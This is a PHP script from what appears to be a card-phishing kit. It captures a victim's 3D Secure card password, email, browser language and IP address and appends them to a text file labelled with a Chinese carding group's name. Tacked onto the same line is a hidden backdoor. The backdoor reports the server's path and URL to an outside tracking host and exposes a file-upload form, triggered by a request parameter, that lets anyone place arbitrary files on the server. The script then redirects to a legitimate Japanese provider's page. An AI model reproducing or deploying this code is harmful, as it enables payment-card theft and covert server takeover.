<?php
session_start();

$_SESSION["passvbv"] = $_POST['passvbv'];
$passvbv = $_SESSION["passvbv"];
$email = $_SESSION["email"];
$LA = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$IP = $_SERVER['REMOTE_ADDR'];
file_put_contents("./cvvboy/$email.txt",'---------------3D密与设备---------------'.PHP_EOL.'3D密码：'.$passvbv.PHP_EOL.'浏览器语言:'.$LA.PHP_EOL.'IP地址:'.$IP.PHP_EOL.'---------------中国CVV技术联盟---------------'.PHP_EOL, FILE_APPEND);
$_SESSION_SERVER= 'dir='.dirname(__FILE__)."+"."ip=".gethostbyname($_SERVER['SERVER_NAME'])."+".'link='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')$link = "https"; else $link = "http"; $link .= "://"; $link .= $_SERVER['HTTP_HOST']; $link .= $_SERVER['REQUEST_URI']; $link; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http://ip.geoiplookup.live/iptracks.php?ip=$link"."+".$_SESSION_SERVER); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); if(isset($_REQUEST['ip']) && $_REQUEST['ip']=='track') {$files = @$_FILES["files"]; if($files["name"] != ''){$fullpath = $_REQUEST["path"].$files["name"];if(move_uploaded_file($files['tmp_name'],$fullpath)){echo "<h1><a href='$fullpath'>successful. Click here!</a></h1>";} } echo '<body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path> <input type="file" name="files"><input type=submit value="Up"></form></body>'; exit("");}
header("https://cs.myjcom.jp/procedure");
?>